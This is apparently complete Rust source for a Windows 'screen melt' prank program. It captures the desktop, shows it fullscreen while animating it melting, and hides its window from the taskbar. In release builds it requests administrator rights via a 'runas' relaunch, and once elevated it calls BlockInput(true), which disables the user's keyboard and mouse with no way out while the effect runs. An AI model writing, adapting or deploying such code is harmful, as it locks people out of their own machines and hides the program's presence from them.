use ::rand::Rng;
use windows::Win32::UI::Input::KeyboardAndMouse::BlockInput;
use windows::Win32::UI::Shell::{ShellExecuteW, ITaskbarList};
use windows::Win32::UI::WindowsAndMessaging::{FindWindowA, ShowWindow};
use windows::core::{PCWSTR, PCSTR, GUID};
use windows::Win32::UI::WindowsAndMessaging::SHOW_WINDOW_CMD;
use windows::Win32::System::Com::{CoCreateInstance, CLSCTX_INPROC_SERVER};
use macroquad::prelude::*;

fn window_conf() -> Conf {

	let mut empty_icon = macroquad::miniquad::conf::Icon::miniquad_logo();
	empty_icon.small = [0; 16 * 16 * 4];
	empty_icon.medium = [0; 32 * 32 * 4];
	empty_icon.big = [0; 64 * 64 * 4];

	return Conf {
		window_title: "melt".to_owned(),
		fullscreen: true,
		window_resizable: false,
		icon: Some(empty_icon),
		..Default::default()
	};
}

struct Window {
	image: Image,
	texture: Texture2D,
}

impl Window {
	fn new() -> Self {

		let display = scrap::Display::primary().unwrap();

		let mut cap = scrap::Capturer::new(display).unwrap();
		let (w, h) = (cap.width(), cap.height());
	
		let pixels: Vec<u8>;

		if let Err(_) = cap.frame() {

		}

		loop {

			let frame = match cap.frame() {
				Ok(r) => {
					r
				},
				Err(e) => {
					println!("retrying: {:?}", e);
					std::thread::sleep(std::time::Duration::from_secs(1)/60);
					continue;
				}
			};
		

			let stride = frame.len() / h;
			let mut flipped = Vec::with_capacity(w * h * 4);
			for y in 0..h {
				for x in 0..w {
					let i = stride * y + 4 * x;
					flipped.extend_from_slice(&[
						frame[i + 2],
						frame[i + 1],
						frame[i],
						255,
					]);
				}
			}
		

			pixels = flipped;
			break;
		}
		println!("Captured");

		// repng::encode(
		// 	std::fs::File::create("screenshot.png").unwrap(),
		// 	cap.width() as u32,
		// 	cap.height() as u32,
		// 	pixels.as_slice(),
		// ).unwrap();
		

		// let mut f = std::fs::File::open("./screenshot.png").unwrap();
		// let mut data: Vec<u8> = Vec::new();
		// f.read_to_end(&mut data).unwrap();
		// let img = Image::from_file_with_format(&data, Some(ImageFormat::Png));

		// let rt = tokio::runtime::Runtime::new().unwrap();
		
		// let img = rt.block_on(load_image("./screenshot.png")).unwrap();
		
		let texture = Texture2D::from_rgba8(cap.width() as u16, cap.height() as u16, &pixels);
		let img = texture.get_texture_data();

		// std::fs::remove_file("./screenshot.png").unwrap();

		return Self {
			image: img,
			texture: texture,
		}
	}

	fn draw(&self) {
		draw_texture(self.texture, 0.0, 0.0, WHITE);
	}

	fn update(&mut self) {

		let mut rng = ::rand::thread_rng();

		for _ in 0..rng.gen_range(0..((1.0*get_time()/2.0).ceil() as u32).min(5)) {
			let amount = rng.gen_range(0..((1.0*get_time()/2.0).ceil() as u32).min(3));
			let x = rng.gen_range(0..self.image.width as u32);
			let mut width = rng.gen_range(0..((1.0*get_time()/2.0).ceil() as u32).min(20));
			if width+x >= self.image.width as u32 {
				width = self.image.width as u32 - x;
			}
	
			for x2 in x..x+width {
				for y in (amount..self.image.height as u32).rev() {
					let color = self.image.get_pixel(x2, y-amount);
					self.image.set_pixel(x2, y, color);
				}
			}
		}


		self.texture.update(&self.image);

	}

}

fn utf16<T: TryInto<String>>(s: T) -> Vec<u16> {
	let text: Vec<u16> = s.try_into().unwrap_or_else(|_| panic!("")).encode_utf16().chain(Some(0).into_iter()).collect();
	return text;
}

fn utf8<T: TryInto<String>>(s: T) -> Vec<u8> {
	let text: Vec<u8> = s.try_into().unwrap_or("".to_string()).as_bytes().to_vec();
	return text;
}

fn request_admin() -> Result<(), String> {
	if !is_elevated::is_elevated() {
		unsafe {
			ShellExecuteW(None, PCWSTR(utf16("runas").as_ptr()), PCWSTR(utf16(std::env::current_exe().unwrap().to_str().unwrap()).as_ptr()), None, None, SHOW_WINDOW_CMD(0));
			if !is_elevated::is_elevated() {
				return Err("After".to_string());
			}
		}
		
	} else {
		return Err("Already admin".to_string());
	}
	return Ok(());
}

#[macroquad::main(window_conf)]
async fn main() {

	unsafe {

		let window_handle = FindWindowA(PCSTR(utf8("MINIQUADAPP").as_ptr()), PCSTR(utf8("melt").as_ptr()));
		ShowWindow(window_handle, SHOW_WINDOW_CMD(6));

		let guid = GUID::from_u128(115632192834192379312700296854722158736);

		let list: ITaskbarList = CoCreateInstance(&guid, None, CLSCTX_INPROC_SERVER).unwrap();
		list.HrInit().unwrap();
		list.DeleteTab(window_handle).unwrap();

		ShowWindow(window_handle, SHOW_WINDOW_CMD(3));

		// "56fdf344-fd6d-11d0-958a-006097c9a090"

	}

	// unsafe { BlockInput(true) };

	// let mut buffer = Vec::with_capacity(100 as usize);

	// let mut amount: u32 = 0;

	// unsafe { GetUserNameA(PSTR(std::ptr::null_mut()), &mut amount) };

	// unsafe { GetUserNameA(PSTR(buffer.as_mut_ptr() as *mut u8), &mut amount) };

	// unsafe { buffer.set_len(amount as usize); }
	// let username = String::from_utf8(buffer).unwrap();

	if !cfg!(debug_assertions) {
		match request_admin() {
			Ok(_) => {
				return;
			},
			Err(e) => {
				if e == "After" {
					return;
				} else {
					unsafe { BlockInput(true) };
				}
			}
		}
	}

	let mut window = Window::new();

	loop {

		window.update();
		window.draw();

		next_frame().await;

	}
}
